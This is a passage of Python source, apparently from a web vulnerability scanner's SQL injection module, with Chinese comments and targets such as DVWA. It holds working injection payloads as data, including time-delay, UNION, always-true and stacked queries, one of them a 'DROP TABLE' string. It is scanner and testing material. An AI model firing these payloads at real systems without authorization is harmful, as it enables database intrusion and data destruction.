                verify_payloads = [
                    f"' AND SLEEP({int(expected_delay)})--",
                    f"') AND SLEEP({int(expected_delay)})--",
                    f"\" AND SLEEP({int(expected_delay)})--",
                ]

                if await self._verify_time_based(
                    url, params, param_name, method, param_type,
                    expected_delay, baseline_avg, verify_payloads
                ):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="time-based-blind",
                        confidence=Confidence.HIGH,
                        db_type="mysql",
                        evidence=f"Time-based: delay={actual_delay:.2f}s (baseline={baseline_avg:.2f}s, expected ~{expected_delay}s)",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Time-based 检测到: {url} [{param_name}], 延迟: {actual_delay:.2f}s")
                    return

    async def _test_stacked_query(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """P7: Quick stacked query detection using semicolon-separated payloads."""
        stacked_payloads = [
            "'; SELECT 1--",
            "'; SELECT SLEEP(2)--",
            "'; WAITFOR DELAY '0:0:2'--",  # MSSQL
            "'; SELECT pg_sleep(2)--",  # PostgreSQL
            "'; SELECT 1 FROM DUAL--",  # Oracle
            "'; DROP TABLE test_wvs--",
        ]
        for payload in stacked_payloads[:4]:
            test_params = self._inject_param(params, param_name, payload)
            start = time.perf_counter()
            resp = await self._send_request(method, url, test_params, param_type)
            elapsed = time.perf_counter() - start
            if resp is None:
                continue
            text = resp.get("text", "")[:5000]
            # Check for DB error or multiple-rowset indicators
            analyzer = ResponseAnalyzer(baseline)
            is_error, db = analyzer.is_sql_error(resp)
            if is_error:
                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "error"):
                    vuln = self._create_vuln(
                        url=url, param=param_name, param_type=param_type, method=method,
                        payload=payload, vuln_type="stacked-query",
                        confidence=Confidence.HIGH, db_type=db or "unknown",
                        evidence=f"Stacked query executed: {resp.get('text', '')[:200]}",
                    )
                    self._found_vulns.append(vuln)
                    return
            # Time-based stacked (e.g. SLEEP in second query)
            if elapsed > 2.0:
                baseline_avg = time.perf_counter() - start + elapsed  # rough baseline
                if elapsed > baseline_avg * 3:
                    vuln = self._create_vuln(
                        url=url, param=param_name, param_type=param_type, method=method,
                        payload=payload, vuln_type="stacked-query-time",
                        confidence=Confidence.MEDIUM, db_type="unknown",
                        evidence=f"Stacked query time delay: {elapsed:.2f}s",
                    )
                    self._found_vulns.append(vuln)
                    return

    # ----------------------------------------------------------
    # 二次验证（核心：防止误报）
    # ----------------------------------------------------------

    async def _verify_with_different_payload(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        vuln_type: str,
    ) -> bool:
        """
        用不同类型的 payload 二次验证，确保不是误报

        Returns:
            True = 验证通过（是真漏洞）
        """
        # 不同漏洞类型用不同的二次验证 payload
        verify_payloads = {
            "error": ["' AND 1=1--", "') AND 1=1--", '") AND 1=1--'],
            "union": ["' UNION SELECT 1,2,3--", "'; SELECT 1--"],
            "boolean": ["' OR '1'='1", '" OR "1"="1'],
            "time": ["'; SELECT SLEEP(2)--"],
        }

        verify_list = verify_payloads.get(vuln_type, [])
        baseline = await self._send_request(method, url, params, param_type)
        for verify_payload in verify_list[:2]:
            test_params = self._inject_param(params, param_name, verify_payload)
            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue
            # P5 fix: actually validate content, not just that a response was received
            if vuln_type == "error":
                analyzer = ResponseAnalyzer(baseline or resp)
                is_error, _ = analyzer.is_sql_error(resp)
                if is_error:
                    return True
            elif vuln_type == "union":
                text = resp.get("text", "")
                if any(m in text for m in ["1,2,3", "1,2,3,4,5", " UNION SELECT"]):
                    return True
            elif vuln_type == "boolean":
                if baseline:
                    # P15: Noise-stripped comparison — prevents reflection FPs.
                    # `_is_response_different` hash check catches ANY single-byte
                    # difference, making it useless against reflected payload pages.
                    import re as _re2
                    def _vstrip(t: str) -> str:
                        t = _re2.sub(r'<[^>]+>', '', t)
                        t = _re2.sub(r"'[^']*'", '', t)
                        t = _re2.sub(r'"[^"]*"', '', t)
                        t = _re2.sub(r'\b(?:AND|OR|NOT|SELECT|UNION|NULL|WHERE|FROM|ORDER|BY|SLEEP|HAVING|LIKE)\b', '', t, flags=_re2.IGNORECASE)
                        t = _re2.sub(r'\b\d+\b', 'N', t)
                        t = _re2.sub(r'[=\<\>\!\+\-\*/%]', ' ', t)
                        t = _re2.sub(r'--|#', ' ', t)
                        t = _re2.sub(r'\b\w\b', '', t)
                        t = _re2.sub(r'\s+', ' ', t).strip()
                        return t
                    bl_clean = _vstrip(baseline.get("text", ""))
                    rp_clean = _vstrip(resp.get("text", ""))
                    if bl_clean != rp_clean:
                        return True
            else:
                return True

        return False

    # ----------------------------------------------------------
    # 工具方法
    # ----------------------------------------------------------

    # 注：_send_request 方法已移至基类 DetectionModule，支持 query/body/cookie 参数类型

    def _inject_param(self, params: Dict[str, str], param_name: str, payload: str) -> Dict[str, str]:
        """在参数字典中注入 payload"""
        new_params = params.copy()
        new_params[param_name] = payload
        return new_params

    def _extract_endpoints(self, target: ScanTarget) -> List[Dict]:
        """从 ScanTarget 提取要检测的端点"""
        endpoints = []
        url = target.url.rstrip("/")

        # 直接对目标 URL 的所有参数进行检测
        parsed = urlparse(url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            # parse_qs 返回的值是列表，flatten
            flat_params = {k: v[0] if v else "" for k, v in query_params.items()}
            base_url = url.split("?")[0]
            endpoints.append({
                "url": base_url,
                "params": flat_params,
                "method": "GET",
                "param_type": "query",
            })

        # 加上 target.data（POST 参数）
        if target.data:
            endpoints.append({
                "url": url,
                "params": target.data,
                "method": "POST",
                "param_type": "body",
            })

        # 加上 target.cookies（Cookie 参数，DVWA / Mutillidae 等靶机常见 id 在 Cookie 里）
        if target.cookies:
            # params 只含测试参数（id=1），auth cookies 在 httpx jar 里单独发送
            endpoints.append({
                "url": url,
                "params": {"id": "1"},  # 测试参数，不是 auth cookies
                "method": "GET",
                "param_type": "cookie",
            })

        # ── 新增：从 HTML 表单中提取参数（DVWA / Mutillidae 等靶机）──
        form_endpoints = self._extract_form_params(target)
        for ep in form_endpoints:
            # 避免重复（URL + params 相同）
            dup = any(
                e["url"] == ep["url"] and e.get("params", {}) == ep.get("params", {})
                for e in endpoints
            )
            if not dup:
                endpoints.append(ep)

        return endpoints

    async def _extract_endpoints_async(self, target: ScanTarget) -> List[Dict]:
        """
        异步版：从 HTML 表单中提取参数，必要时主动请求目标页面。
        当没有 URL query 参数时，直接请求目标 URL 获取表单参数。
        """
        endpoints = self._extract_endpoints(target)

        # 如果已有参数，不需要额外抓取
        if any(ep["params"] for ep in endpoints):
            return endpoints

        # 没有参数 → 主动请求目标 URL，解析 HTML 表单
        logger.debug(f"[SQLi] 无参数，尝试提取表单参数: {target.url}")
        try:
            resp = await self._send_request("GET", target.url, {}, "query")
            if resp and resp.get("text"):
                # 临时替换 target.html，供 _extract_form_params 使用
                original_html = getattr(target, "html", None)
                target.html = resp["text"]
                form_eps = self._extract_form_params(target)
                target.html = original_html  # 恢复
                for ep in form_eps:
                    dup = any(
                        e["url"] == ep["url"] and e.get("params", {}) == ep.get("params", {})
                        for e in endpoints
                    )
                    if not dup:
                        endpoints.append(ep)
        except Exception as e:
            logger.debug(f"[SQLi] 抓取表单失败 {target.url}: {e}")

        return endpoints

    def _extract_form_params(self, target: ScanTarget) -> List[Dict]:
        """
        从目标 HTML 响应中提取表单参数，用于检测表单中隐藏的注入点。

        适用场景：
        - DVWA SQLi 页面（/dvwa/vulnerabilities/sqli/）— 爬虫只发现 URL，表单参数需从 HTML 提取
        - Mutillidae / OWASP WebGoat 等靶机的表单参数页面

        Returns:
            [{url, params, method, param_type}, ...]
        """
        endpoints = []
        html = getattr(target, "html", "") or ""

        if not html:
            return endpoints

        url = target.url.rstrip("/")

        # 找到页面中所有 <form> 标签
        # 支持 <form action="..." method="GET|POST">
        form_pattern = re.compile(
            r'<form[^>]*\baction\s*=\s*["\']([^"\']*)["\'][^>]*>',
            re.IGNORECASE,
        )
        method_pattern = re.compile(
            r'<form[^>]*\bmethod\s*=\s*["\']([^"\']*)["\']',
            re.IGNORECASE,
        )

        for form_match in form_pattern.finditer(html):
            form_action = form_match.group(1).strip()
            form_method = method_pattern.search(form_match.group(0))
            method = form_method.group(1).upper() if form_method else "GET"

            # 解析 action：相对路径 → 绝对路径
            if form_action.startswith("/"):
                form_url = "".join([
                    parsed.scheme if (parsed := urlparse(url)) else "http",
                    "://",
                    parsed.netloc if parsed else "",
                    form_action,
                ])
            elif form_action and not form_action.startswith("http"):
                form_url = urljoin(url, form_action)
            else:
                form_url = form_action or url

            form_url = form_url.rstrip("/")
            # 避免跨域提交
            if not form_url.startswith(urlparse(url).scheme + "://"):
                continue

            # 提取表单内所有 input 的 name + 默认 value
            form_start = form_match.start()
            form_end = html.find("</form>", form_start)
            if form_end == -1:
                form_end = form_start + 2000  # fallback
            form_body = html[form_start:form_end]

            # 提取 input 参数（排除 submit/button/image/file/reset type）
            # P6: 不再排除 hidden — DVWA SQLi 页面的 id 参数就是 hidden type
            SKIP_TYPES = {"submit", "button", "image", "reset", "file"}
            input_pattern = re.compile(
                r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']',
                re.IGNORECASE,
            )
            type_pattern = re.compile(r'\btype\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)
            value_pattern = re.compile(r'\bvalue\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)

            params = {}
            for inp_match in input_pattern.finditer(form_body):
                inp_name = inp_match.group(1)
                # 在 input 标签内查找 value（可能出现在 name 之前或之后）
                inp_tag = inp_match.group(0)
                # 获取完整 input 标签用于 value 查找
                tag_start = inp_match.start()
                tag_end = form_body.find(">", tag_start) + 1
                full_tag = form_body[tag_start:tag_end]
                inp_value_m = value_pattern.search(full_tag)
                inp_value = inp_value_m.group(1) if inp_value_m else ""
                inp_type_m = type_pattern.search(full_tag)
                inp_type = (inp_type_m.group(1).lower() if inp_type_m else "text")

                if inp_type in SKIP_TYPES:
                    continue
                if inp_name in params:
                    continue
                params[inp_name] = inp_value

            # 提取 <select> 元素（取第一个 option 值）
            select_pattern = re.compile(
                r'<select[^>]*\bname\s*=\s*["\']([^"\']+)["\']',
                re.IGNORECASE,
            )
            option_pattern = re.compile(
                r'<option[^>]*\bvalue\s*=\s*["\']([^"\']*)["\']',
                re.IGNORECASE,
            )
            for sel_match in select_pattern.finditer(form_body):
                sel_name = sel_match.group(1)
                if sel_name in params:
                    continue
                sel_start = sel_match.start()
                sel_end = form_body.find("</select>", sel_start)
                if sel_end == -1:
                    sel_end = sel_start + 500
                sel_body = form_body[sel_start:sel_end]
                opt_match = option_pattern.search(sel_body)
                params[sel_name] = opt_match.group(1) if opt_match else "1"

            if params:
                endpoints.append({
                    "url": form_url,
                    "params": params,
                    "method": method,
                    "param_type": "body" if method == "POST" else "query",
                })

        return endpoints

    def _create_vuln(
        self,
        url: str,
        param: str,
        param_type: str,
        method: str,
        payload: str,
        vuln_type: str,
        confidence: Confidence,
        db_type: str,
        evidence: str,
    ) -> Vulnerability:
        """创建漏洞对象"""
        return Vulnerability(
            type=VulnerabilityType.SQL_INJECTION,
            title=f"SQL Injection ({vuln_type}) — {db_type}",
            url=url,
            method=method,
            parameter=param,
            parameter_type=param_type,
            payload=payload,
            evidence=evidence,
            severity=Severity.HIGH,
            confidence=confidence,
            description=f"发现 {vuln_type} 类型 SQL 注入漏洞，可能数据库类型为 {db_type}",
            recommendation="使用参数化查询（Prepared Statement）或预编译语句，避免字符串拼接 SQL",
            module="sqli",
            tags=["sql-injection", vuln_type, db_type],
            context={"vuln_type": vuln_type, "db_type": db_type},
        )
